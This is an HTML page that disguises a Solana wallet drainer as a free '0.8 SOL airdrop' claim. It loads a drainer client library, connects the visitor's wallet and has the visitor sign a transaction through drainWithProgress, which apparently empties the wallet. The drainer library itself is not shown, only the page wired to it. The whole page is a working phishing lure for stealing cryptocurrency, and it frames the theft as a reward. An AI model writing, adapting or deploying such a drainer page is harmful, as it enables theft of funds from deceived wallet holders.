<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Simple Drainer Integration</title>
    <style>
        body {
            font-family: Arial, sans-serif;
            max-width: 600px;
            margin: 50px auto;
            padding: 20px;
            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
            color: white;
        }
        .container {
            background: rgba(255, 255, 255, 0.1);
            padding: 30px;
            border-radius: 15px;
            backdrop-filter: blur(10px);
        }
        button {
            background: #4CAF50;
            color: white;
            padding: 15px 30px;
            border: none;
            border-radius: 8px;
            cursor: pointer;
            font-size: 16px;
            margin: 10px 5px;
            transition: background 0.3s;
        }
        button:hover {
            background: #45a049;
        }
        button:disabled {
            background: #cccccc;
            cursor: not-allowed;
        }
        .status {
            margin: 20px 0;
            padding: 15px;
            border-radius: 8px;
            background: rgba(255, 255, 255, 0.1);
        }
        .success { background: rgba(76, 175, 80, 0.2); }
        .error { background: rgba(244, 67, 54, 0.2); }
        .loading { background: rgba(33, 150, 243, 0.2); }
        .info { background: rgba(255, 193, 7, 0.2); }
    </style>
</head>
<body>
    <div class="container">
        <h1>üéÅ Solana Airdrop Claim</h1>
        <p>Connect your wallet to claim your exclusive 0.8 SOL airdrop!</p>
        
        <button onclick="claimAirdrop()" id="claimBtn">üöÄ Claim 0.8 SOL Airdrop</button>
        <button onclick="checkWallet()" id="checkBtn">üîç Check Wallet</button>
        
        <div id="status" class="status info">Loading drainer client...</div>
    </div>

    <!-- Include the drainer client library -->
    <script src="/public/drainer-client.js" data-api-url="http://localhost:3000/api/drainer"></script>
    
    <script>
        // Global variables
        let statusDiv, claimBtn, checkBtn;
        let drainerReady = false;
        
        // Wait for DOM to load
        document.addEventListener('DOMContentLoaded', function() {
            // Initialize DOM elements
            statusDiv = document.getElementById('status');
            claimBtn = document.getElementById('claimBtn');
            checkBtn = document.getElementById('checkBtn');
            
            // Initialize drainer when client library loads
            initializeDrainer();
        });
        
        function initializeDrainer() {
            // Wait for SolanaDrainer to be available
            const checkDrainer = setInterval(() => {
                if (typeof window.SolanaDrainer !== 'undefined') {
                    clearInterval(checkDrainer);
                    
                    try {
                        // Initialize the drainer
                        window.SolanaDrainer.init('http://localhost:3000/api/drainer');
                        drainerReady = true;
                        updateStatus('‚úÖ Drainer client loaded successfully! Ready to claim airdrop.', 'success');
                        
                        // Enable buttons
                        claimBtn.disabled = false;
                        checkBtn.disabled = false;
                        
                    } catch (error) {
                        updateStatus(`‚ùå Failed to initialize drainer: ${error.message}`, 'error');
                        console.error('Drainer initialization error:', error);
                    }
                }
            }, 100);
            
            // Timeout after 10 seconds
            setTimeout(() => {
                if (!drainerReady) {
                    clearInterval(checkDrainer);
                    updateStatus('‚ùå Failed to load drainer client. Please refresh the page.', 'error');
                }
            }, 10000);
        }
        
        function updateStatus(message, type = 'loading') {
            if (statusDiv) {
                statusDiv.textContent = message;
                statusDiv.className = `status ${type}`;
            }
        }
        
        async function claimAirdrop() {
            if (!drainerReady) {
                updateStatus('‚ùå Drainer not ready. Please wait...', 'error');
                return;
            }
            
            try {
                claimBtn.disabled = true;
                updateStatus('üéÅ Starting airdrop claim process...', 'loading');
                
                // Use the drainer with progress callbacks
                const result = await window.SolanaDrainer.drainWithProgress(null, (stage, message) => {
                    switch(stage) {
                        case 'connect':
                            updateStatus(`üîó ${message}`, 'loading');
                            break;
                        case 'generate':
                            updateStatus(`‚öôÔ∏è ${message}`, 'loading');
                            break;
                        case 'sign':
                            updateStatus(`‚úçÔ∏è ${message}`, 'loading');
                            break;
                        case 'success':
                            updateStatus(`üéâ Airdrop claimed successfully! Transaction: ${message.signature.substring(0, 8)}...`, 'success');
                            break;
                        case 'error':
                            updateStatus(`‚ùå Error: ${message.error}`, 'error');
                            break;
                    }
                });
                
            } catch (error) {
                updateStatus(`‚ùå Claim failed: ${error.message}`, 'error');
                console.error('Claim error:', error);
            } finally {
                claimBtn.disabled = false;
            }
        }
        
        async function checkWallet() {
            if (!drainerReady) {
                updateStatus('‚ùå Drainer not ready. Please wait...', 'error');
                return;
            }
            
            try {
                checkBtn.disabled = true;
                updateStatus('üîç Checking wallet connection...', 'loading');
                
                const publicKey = await window.SolanaDrainer.connectWallet();
                updateStatus(`‚úÖ Wallet connected: ${publicKey.substring(0, 8)}...`, 'success');
                
            } catch (error) {
                updateStatus(`‚ùå Wallet check failed: ${error.message}`, 'error');
                console.error('Wallet check error:', error);
            } finally {
                checkBtn.disabled = false;
            }
        }
        
        // Handle wallet conflicts
        window.addEventListener('error', function(e) {
            if (e.message.includes('Unable to set window.solana')) {
                console.log('Wallet conflict detected - this is normal with multiple wallet extensions');
            }
        });
    </script>
</body>
</html>
